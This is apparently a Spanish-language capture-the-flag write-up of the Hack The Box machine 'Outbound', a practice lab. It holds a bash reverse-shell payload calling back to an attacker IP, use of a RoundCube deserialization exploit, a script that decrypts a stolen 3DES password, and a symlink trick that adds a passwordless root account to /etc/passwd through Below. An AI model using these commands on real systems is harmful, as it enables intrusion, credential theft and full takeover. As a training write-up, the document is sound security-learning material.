---
tags:
title: Outbound - Easy (HTB)
permalink: /Outbound-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---

---
# Reconocimiento

```bash
nmap -sS -p- --open --min-rate 5000 -n -vvv 10.10.11.77 -oG allPOrts
```

![Pasted image 20250714175643](images/Pasted image 20250714175643.png)

Podemos ver que corre el servicio de RoundCube

`Credentials`

`> tayler:LhKL1o9Nm3X2`

![Pasted image 20250714212208](images/Pasted image 20250714212208.png)

Vemos que la versión que corre para RoundCube es una versión vulnerable a una *deserialización de objetos PHP insegura*. La vulnerabilidad está en `program/actions/settings/upload.php`, donde el parámetro _from de la URL no se valida correctamente.
Como resultado, un usuario autenticado puede enviar datos manipulados y ejecutar código arbitrario en el servidor (RCE post-autenticación).

A continuación un `PoC` para la explotación de esta vulnerabilidad:

https://github.com/fearsoff-org/CVE-2025-49113


Primero desde nuestra maquina creamos un archivo *index.html* que contenga lo siguiente 

```bash
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.16.118/4444 0>&1"
```

Montamos un servidor en python por el puerto 80 

```bash 
python3 -m http.server 80
```

Para despues mediante el PoC hacer una peticion por *curl* a nuestro *index* y que lo ejecute con *bash*, para asi recibir nuestra *shell*

```bash 
php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "curl http://<IP-ATACANTE>:80/index.html"
```

---
# User  Flag

Una vez dentro de la maquina vemos que es un contenedor y si nos fijamos bien vemos que en la ruta `/var/www/html/roundcube/config`, hay un archivo `config.inc.php` el cual contiene credenciales de una base de datos *MySql* con las credenciales y una secret-key para encriptacion `des3-CBC`

`> roundcube:RCDBPass2025`

`> rcmail-!24ByteDESkey*Str`  <---Secret-Key (des3-CBC)

```bash 
mysql -u roundcube -pRCDBPass2025`
```

Vemos la base de datos de roundcube la cual guarda de una manera especial las credenciales de los usuarios, las guarda en la tabla `session`, y su contenido en *base64*, a medida que vayamos probando la decodificacion de las lineas en base64 veremos que son de los usuarios `jacob` y `tyler`, es entonces cuando podemos ver que jacob tiene una contraseña con encriptacion `des3-CBC`, para la cual necesitamos de sus secret-key para decodificarla y asi obtener su contraseña

Para decodificarla con la secret-key seguimos usamos este script en python

Contraseña desencriptada en base64 del usuario Jacob:
`L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`

![Pasted image 20250714193834](images/Pasted image 20250714193834.png)

```python
from base64 import b64decode
from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad

# === DATOS QUE TENÉS QUE CAMBIAR ===
encrypted_b64 = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/'  # tu password cifrada en base64
des_key = b'rcmail-!24ByteDESkey*Str'              # tu des_key de config.inc.php (24 bytes)
# ====================================

# Decodificamos el base64
encrypted = b64decode(encrypted_b64)

# Extraemos el IV y el contenido cifrado
iv = encrypted[:8]              # primeros 8 bytes
ciphertext = encrypted[8:]     # el resto

# Creamos el cifrador con clave e IV
cipher = DES3.new(des_key, DES3.MODE_CBC, iv)

# Desencriptamos y despaddeamos
try:
    decrypted = unpad(cipher.decrypt(ciphertext), DES3.block_size)
    print("[+] Contraseña desencriptada:", decrypted.decode())
except ValueError:
    print("[-] Error: padding incorrecto o clave/IV inválido.")
except Exception as e:
    print("[-] Error:", str(e))
```

```bash 
python3 decode.py
```

Lo que nos da como resultado: `595mO8DmwGeD`

`Credentials`: `jacob:595mO8DmwGeD`

`SSH`
```bash 
ssh jacob@mail 
595mO8DmwGeD
```

o Por migracion de usuario

```bash 
su jacob 
```

Una vez dentro de jacob aun no tenemos la flag pero si vamos a la ruta `/home/jacob/mail/INBOX/` podemos ver un archivo `jacob` el cual contiene sus credenciales de su usuario sobre el dominio *outbound.htb* y el cual vemos un mensaje *mel* el cual nos dice que habilitaron una herramientas de `Below` el cual es un programa de monitorizacion con el cual nos dan privilegios para visualizar los logs del mismo.

![Pasted image 20250714203430](images/Pasted image 20250714203430.png)

`jacob:gY4Wr3a1evp4`

``` bash 
 ssh jacob@outbound
```

```bash 
cat user.txt
```

---

# Root Flag

```bash 
sudo -l
```

![Pasted image 20250714203707](images/Pasted image 20250714203707.png)

Vemos que si, tenemos privilegios con `Below`, del cual tiene una vulnerabilidad *(CVE-2025-27591)* la cual consta de la creacion de archivos en la ruta `/var/log/below` con permisos `0777` o archivos de registro `/root_log.` el cual tiene permisos `0666` lo que lo hace visible para todos, lo cual deriva en la posibilidad de que el atacante cree `symlinks` *(Links simbolicos)* `ln -s /etc/shadow /var/log/below/error_<tu_usuario>.log` , para luego forzar que `Below` sobreescriba el contenido de los mismos, de modo que puedan inyectar credenciales o abrir paso a una acceso como root de la siguiente forma

```bash 
u=$(id -un)
rm -f /var/log/below/error_$u.log
ln -s /etc/passwd /var/log/below/error_$u.log
echo 'pwn::0:0:root:/root:/bin/bash' > /var/log/below/error_$u.log
LOGS_DIRECTORY=/var/log/below sudo /usr/bin/below snapshot --begin now
su pwn
```

```bash 
cat root.txt
```

`~Happy Hacking`